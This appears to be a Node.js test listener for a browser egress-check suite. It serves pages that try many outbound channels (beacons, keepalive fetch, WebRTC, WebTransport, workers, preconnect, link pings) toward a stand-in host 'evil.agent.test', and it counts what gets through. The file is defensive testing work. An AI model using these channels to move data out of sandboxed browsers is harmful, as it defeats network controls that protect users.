import { createServer } from 'node:http';
import { createInterface } from 'node:readline';

function usage() {
  process.stdout.write(`Usage: node tools/r3-trials/web/ways-listener.mjs

The listener of the rows of U0.7b (contract A13.7) that run under the egress check. Plain HTTP on
127.0.0.1 and a port that the system picks serves one page per row at /way/<row>, and counts every
request by path, with the count of requests whose Accept header names a signed exchange. It also
serves the reach rows of CP-78 at /reach/<context> and counts each request to evil.agent.test by
its context, with its bytes, and each context's report /did that it ran. The pages
reach out only to the host evil.agent.test on this listener's port, which the relay's list does not
hold, to names under .example and .invalid, and to addresses of the documentation ranges
(192.0.2.0/24, 2001:db8::/32). It prints one line "listening 127.0.0.1:<port>". Each line "count"
on its standard input gets one line "count <json>". It stops at the end of its standard input, on
TERM or on INT. Exit 0 when it stopped, 2 for a refusal: one line REFUSED <usage|port>: <detail> on
standard error.
`);
}

function refuse(cause, detail) {
  process.stderr.write(`REFUSED ${cause}: ${detail}\n`);
  process.exit(2);
}

const argv = process.argv.slice(2);
if (argv.includes('--help')) {
  usage();
  process.exit(0);
}
if (argv.length !== 0) refuse('usage', 'see --help');

const H = 'utility.agent.test';
const E = 'evil.agent.test';
const counts = { paths: {}, sxg_accept: 0, evil: {}, evil_bytes: 0, did: {} };
const bump = (map, key) => { map[key] = (map[key] || 0) + 1; };

// The rows of CP-78: a read to evil.agent.test from each kind of context, with a report to the
// page's own origin that the context ran. The pages are served on 127.0.0.1, a secure context.
function reachRead(ctx) {
  return `fetch('http://${E}:${port}/read?ctx=${ctx}', { mode: 'no-cors' }).catch(() => {});
fetch('/did?ctx=${ctx}').catch(() => {});`;
}

function reach(name, q) {
  const js = { 'Content-Type': 'text/javascript', 'Cache-Control': 'no-store' };
  switch (name) {
    case 'page':
      return [html, `<!doctype html><title>reach page</title><script>${reachRead('page')}</script>`];
    case 'opener':
      return [html, `<!doctype html><title>reach opener</title><button onclick="window.open('/reach/opened')">Open</button>`];
    case 'opened':
      return [html, `<!doctype html><title>reach opened</title><script>${reachRead('opened')}</script>`];
    case 'frame':
      return [html, `<!doctype html><title>reach frame</title><iframe src="http://${H}:${port}/reach/frame_inner"></iframe>`];
    case 'frame_inner':
      return [html, `<!doctype html><title>reach frame inner</title><script>${reachRead('frame')}</script>`];
    case 'worker':
      return [html, `<!doctype html><title>reach worker</title><script>new Worker('/reach/w.js?ctx=worker');</script>`];
    case 'shared':
      return [html, `<!doctype html><title>reach shared</title><script>new SharedWorker('/reach/w.js?ctx=shared');</script>`];
    case 'w.js':
      return [js, reachRead(q.get('ctx') === 'shared' ? 'shared' : 'worker')];
    case 'service':
      return [html, `<!doctype html><title>reach service</title><script>
if (!navigator.serviceWorker) fetch('/did?ctx=service_absent');
else navigator.serviceWorker.register('/reach/sw.js').then(() => fetch('/did?ctx=service_registered'), (e) => fetch('/did?ctx=service_refused_' + e.name));
</script>`];
    case 'sw.js':
      return [js, `self.addEventListener('install', () => { ${reachRead('service')} });
self.addEventListener('activate', () => { ${reachRead('service')} });`];
    default:
      return null;
  }
}
let port = 0;

const html = { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' };

function page(row) {
  const evil = `http://${E}:${port}`;
  switch (row) {
    case 'no_worker_paths':
      return [html, `<!doctype html><title>no worker paths</title>
<script type="speculationrules">{"prerender":[{"source":"list","urls":["/pre"]}],"prefetch":[{"source":"list","urls":["/pf"]}]}</script>
<link rel="prefetch" href="/sxg" as="document">
<script>
if (navigator.serviceWorker) navigator.serviceWorker.register('/sw.js').then(() => fetch('/r?sw=registered'), (e) => fetch('/r?sw=' + encodeURIComponent(e.name)));
else fetch('/r?sw=absent');
</script>`];
    case 'udp_quic':
      return [{ ...html, 'Alt-Svc': 'h3=":443"; ma=3600' }, `<!doctype html><title>udp quic</title><script>
for (const u of ['https://192.0.2.1/q', 'https://[2001:db8::1]/q', 'https://quic-way.example/q']) fetch(u, { mode: 'no-cors' }).catch(() => {});
</script>`];
    case 'webtransport':
      return [html, `<!doctype html><title>webtransport</title><script>
for (const u of ['https://192.0.2.1:4433/wt', 'https://[2001:db8::1]:4433/wt', 'https://${E}:${port}/wt']) {
  try { const t = new WebTransport(u); t.ready.catch(() => {}); t.closed.catch(() => {}); } catch (e) {}
}
</script>`];
    case 'peer_connection':
      return [html, `<!doctype html><title>peer connection</title><script>
(async () => {
  try {
    const pc = new RTCPeerConnection({ iceServers: [
      { urls: 'stun:192.0.2.1:3478' },
      { urls: 'turn:192.0.2.2:3478?transport=udp', username: 'u', credential: 'c' },
      { urls: 'turn:192.0.2.3:3478?transport=tcp', username: 'u', credential: 'c' },
      { urls: 'stun:[2001:db8::1]:3478' },
    ] });
    pc.createDataChannel('x');
    await pc.setLocalDescription(await pc.createOffer());
    globalThis.halvoPc = pc;
  } catch (e) {}
})();
</script>`];
    case 'secure_dns':
      return [html, `<!doctype html><title>secure dns</title><script>
for (const u of ['https://dns-way.example/', 'http://dns-way-2.example/', 'http://dns-way.invalid/']) fetch(u, { mode: 'no-cors' }).catch(() => {});
</script>`];
    case 'lan_discovery':
      return [html, `<!doctype html><title>lan discovery</title><script>
fetch('http://halvo-way.local/', { mode: 'no-cors' }).catch(() => {});
try { new PresentationRequest(['https://192.0.2.1/cast']).getAvailability().catch(() => {}); } catch (e) {}
</script>`];
    case 'link_lookup':
      return [html, `<!doctype html><title>link lookup</title>
<link rel="dns-prefetch" href="//lookup-way.example">
<link rel="preconnect" href="https://preconnect-way.example">
<link rel="preconnect" href="http://192.0.2.1">
<link rel="dns-prefetch" href="//192.0.2.4">
<link rel="preconnect" href="${evil}">
<body>link lookup</body>`];
    case 'after_unload':
      return [html, `<!doctype html><title>after unload</title><script>
try { fetchLater('${evil}/later', { method: 'POST', body: 'x' }); } catch (e) {}
addEventListener('pagehide', () => {
  navigator.sendBeacon('${evil}/beacon', 'x');
  fetch('${evil}/keepalive', { method: 'POST', body: 'x', keepalive: true }).catch(() => {});
  navigator.sendBeacon('http://192.0.2.1/beacon', 'x');
});
</script><a href="/way/next" ping="${evil}/ping">next</a>`];
    case 'reports': {
      const to = `http://${H}:${port}`;
      return [{
        ...html,
        'Reporting-Endpoints': `main="${to}/report"`,
        'Report-To': JSON.stringify({ group: 'main', max_age: 86400, endpoints: [{ url: `${to}/report-to` }] }),
        'Content-Security-Policy-Report-Only': `img-src 'none'; report-uri ${to}/report-uri; report-to main`,
        'Permissions-Policy': 'geolocation=()',
        'Document-Policy': 'force-load-at-top',
      }, `<!doctype html><title>reports</title><img src="/img.png"><script>
try { navigator.geolocation.getCurrentPosition(() => {}, () => {}); } catch (e) {}
try { document.execCommand('insertBrOnReturn'); } catch (e) {}
</script>`];
    }
    case 'handler_launch':
      // The frame and the two navigations come after the load, so that the executor's open ends.
      return [html, `<!doctype html><title>handler launch</title><body>handler launch<script>
addEventListener('load', () => {
  setTimeout(() => { const f = document.createElement('iframe'); f.src = 'halvo-way-test:frame'; document.body.appendChild(f); }, 100);
  setTimeout(() => { location.href = 'mailto:way@example.invalid'; }, 300);
  setTimeout(() => { location.href = 'halvo-way-test:launch'; }, 900);
});
</script>`];
    case 'updater_wake':
      return [html, '<!doctype html><title>updater wake</title><body>a page that does nothing for 75 s</body>'];
    case 'next':
      return [html, '<!doctype html><title>next</title><body>next</body>'];
    default:
      return null;
  }
}

const server = createServer((req, res) => {
  const url = new URL(req.url, 'http://x');
  const path = url.pathname;
  counts.paths[path] = (counts.paths[path] || 0) + 1;
  if (path === '/r') counts.paths[`/r${url.search}`] = (counts.paths[`/r${url.search}`] || 0) + 1;
  if (/signed-exchange/i.test(req.headers.accept || '')) counts.sxg_accept += 1;
  if ((req.headers.host || '').startsWith(`${E}:`)) {
    bump(counts.evil, url.searchParams.get('ctx') || '-');
    counts.evil_bytes += req.rawHeaders.reduce((n, h) => n + h.length, 0) + req.url.length;
    res.writeHead(204);
    return res.end();
  }
  if (path === '/did') bump(counts.did, url.searchParams.get('ctx') || '-');
  if (path.startsWith('/reach/')) {
    const p = reach(path.slice(7), url.searchParams);
    if (p) { res.writeHead(200, p[0]); return res.end(p[1]); }
  }
  if (path.startsWith('/way/')) {
    const p = page(path.slice(5));
    if (p) { res.writeHead(200, p[0]); return res.end(p[1]); }
  }
  if (path === '/sw.js') { res.writeHead(200, { 'Content-Type': 'text/javascript' }); return res.end('self.onfetch = () => {};'); }
  if (path === '/sxg') {
    res.writeHead(200, { 'Content-Type': 'application/signed-exchange;v=b3', 'X-Content-Type-Options': 'nosniff' });
    return res.end('sxg1-b3\0');
  }
  if (path === '/pre' || path === '/pf') { res.writeHead(200, html); return res.end('<!doctype html><title>pre</title>'); }
  res.writeHead(204, { 'Access-Control-Allow-Origin': '*' });
  res.end();
});
server.on('error', (err) => refuse('port', `listen failed (${err.code || err.name})`));
await new Promise((r) => server.listen({ host: '127.0.0.1', port: 0, exclusive: true }, r));
port = server.address().port;
process.stdout.write(`listening 127.0.0.1:${port}\n`);

function stop() {
  server.close();
  server.closeAllConnections?.();
  setTimeout(() => process.exit(0), 500).unref();
}
const lines = createInterface({ input: process.stdin });
lines.on('line', (line) => {
  if (line.trim() === 'count') process.stdout.write(`count ${JSON.stringify({ port, ...counts })}\n`);
});
lines.on('close', stop);
process.on('SIGTERM', stop);
process.on('SIGINT', stop);
